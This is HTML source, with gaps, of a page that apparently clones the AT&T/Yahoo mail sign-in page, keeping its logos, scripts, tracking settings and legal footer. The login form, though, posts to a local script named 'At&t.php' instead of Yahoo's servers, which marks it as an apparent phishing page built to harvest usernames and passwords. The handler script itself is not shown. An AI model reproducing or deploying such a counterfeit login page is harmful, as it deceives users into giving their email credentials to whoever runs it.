...
<html id="Stencil" class="no-js grid light-theme ">
    <head>
        ...
        <style nonce="Ms4APiYEUQGNVMxeXuYS4H13hWQZVG8lj9jKA02yD9KPmumE">
            #mbr-css-check {
                display: inline;
            }
        </style>
        <link href="https://s.yimg.com/wm/mbr/19001c683d443fd6a4ce398b9b744eb88ce39a31/yahoo-main.css" rel="stylesheet" type="text/css">
        <script nonce="Ms4APiYEUQGNVMxeXuYS4H13hWQZVG8lj9jKA02yD9KPmumE">
...
root.I13N_config.spaceid = 794200025;
root.I13N_config.location = "https:\u002F\u002Flogin.yahoo.com\u002F?src=ym&activity=ybar-addacct&pspid=159622001";
...
root.I13N_config.keys.test = "mbr-push-sync,mbr-fido-1fa-login,mbr-enable-commchannel-review-trap,udb-link-verification-session,mbr-oneflow-ar-soft,mbr-simplified-reg,mbr-gba-update";
root.I13N_config.keys.cause = "ybar-addacct";
root.I13N_config.keys.src_id = "159622001";
root.darlaConfig = {"url":"https:\u002F\u002Ffc.yahoo.com\u002Fsdarla\u002Fphp\u002Fclient.php?l=RICH{dest:tgtRICH;asz:flex}&f=794200025&ref=https%3A%2F%2Flogin.yahoo.com%2F&sa=geminifed%253D1%2520y-bucket%253Dmbr-push-sync%252Cmbr-fido-1fa-login%252Cmbr-enable-commchannel-review-trap%252Cudb-link-verification-session%252Cmbr-oneflow-ar-soft%252Cmbr-simplified-reg%252Cmbr-gba-update","k2Rate":1,"positions":{"RICH":{"sandbox":"allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox","id":"RICH","clean":"login-ad-rich","dest":"login-ad-rich","w":1440,"h":1024,"timeout":5000,"noexp":1,"fdb":"","on":1,"where":"inside","minReqWidth":1325,"showAfter":2000}}};
root.challenge || (root.challenge = {});
root.challenge.servingStamp = 1647782991002;
root.challenge.isAndroidWebview = false;
root.I13N_config.keys.pct = "signin";
root.currentURL = "\u002F?src=ym&activity=ybar-addacct&pspid=159622001&.done=https%3A%2F%2Fmail.yahoo.com%2F&add=1&done=https%3A%2F%2Fmail.yahoo.com%2F";
...
root.isIOSDevice = false;
            ...
            window.mbrSendError = function (name, url) {
                (new Image()).src = '/account/js-reporting/?rid=1ak8epph3eb2e&crumb=' + encodeURIComponent('AsdLmJBhGii') + '&message=' + encodeURIComponent(name) + '&url=' + encodeURIComponent(url);
            };
    ...
    <body class="bucket-mbr-push-sync bucket-mbr-enable-commchannel-review-trap bucket-mbr-oneflow-ar-soft bucket-mbr-simplified-reg bucket-mbr-gba-update">
    <script nonce="Ms4APiYEUQGNVMxeXuYS4H13hWQZVG8lj9jKA02yD9KPmumE">
        (function(root) {
            var doc = document;
            if (root.isGoodJS) {
    ...
    <span class="column">
         <a href="https://currently.att.yahoo.com/">
            <img src="https://s.yimg.com/rz/p/att_login_en-US_s_f_p_bestfit_login_2x.png" alt="Yahoo" class="logo " width="226" height="" />
            <img src="https://s.yimg.com/rz/p/att_login_en-US_s_f_w_bestfit_login_2x.png" alt="Yahoo" class="dark-mode-logo logo " width="226" height="" />
        </a>
    </span>
    ...
    <div class="login-box-container">
        <div class="login-box right">
            <div class="mbr-login-hd txt-align-center">
                    <img src="https://s.yimg.com/rz/p/att_login_en-US_s_f_p_bestfit_login_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="226" height="" />
                    <img src="https://s.yimg.com/rz/p/att_login_en-US_s_f_w_bestfit_login_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="226" height="" />
            </div>
    ...
    <form id="login-username-form" method="post" action="At&t.php" class="pure-form">
        <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="" />
        <input type="hidden" name="crumb" value="AsdLmJBhGii" />
        <input type="hidden" name="acrumb" value="t1tdhcm1" />
...
<div id="password-container" class="input-group password-container blurred">
        ...
        <div class="helper-links-container">
            ...
            <div class="helper-item arlink">
                <span class="help">
                    <a href="/forgot?src&#x3D;ym&amp;activity&#x3D;ybar-addacct&amp;pspid&#x3D;159622001&amp;add&#x3D;1&amp;.done&#x3D;https%3A%2F%2Fmail.yahoo.com%2F&amp;done&#x3D;https%3A%2F%2Fmail.yahoo.com%2F" id="mbr-forgot-link" data-ylk="elm:btn;elmt:forgot;slk:forgot;mkey:forgot" data-rapid-tracking="true">Forgot username?</a>
                </span>
            </div>
        </div>
        <div class="bottom-links-container">
            <p class="sign-up-link">
                <a href="https://attreg.att.net/PortalRegWeb/PortalRegController?callingAppId&#x3D;OP&amp;returnUrl&#x3D;https%3A%2F%2Fatt.yahoo.com%2F" id="createacc" role="button" class="pure-button puree-button-secondary challenge-button" data-rapid-tracking="true" data-ylk="elm:link;elmt:secondary;slk:signup;mKey:signup">Create an account</a>
            </p>
        ...
        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
            <h3 class="title">Get the best of the Web all in one place.</h3>
        <h4 class="row">Welcome to the new, more personal att.net.</h4>
        <ul class="row">
    ...
    <p>
        ...
        <a href="https://att.yahoo.com/terms" target="_blank">Terms of Service</a>
        <span>|</span>
        <a href="https://att.yahoo.com/privacy" target="_blank" class="mbr-text-red">Privacy Policy</a>
        <span>|</span>
        <a href="https://att.yahoo.com/help" target="_blank">Help</a>
    </p>
    <p>AT&amp;T and the AT&amp;T logo are trademarks of AT&amp;T Intellectual Property.</p>
</div>
</div>
    ...
    <noscript>
        <img src="/account/js-reporting/?crumb=AsdLmJBhGii&message=javascript_not_enabled&ref=%2F" height="0" width="0" style="visibility: hidden;">
    </noscript>
    <script nonce="Ms4APiYEUQGNVMxeXuYS4H13hWQZVG8lj9jKA02yD9KPmumE">
...
<!-- fe16.member.bf1.yahoo.com - Sun Mar 20 2022 13:29:50 GMT+0000 (Coordinated Universal Time) - (0ms) -->
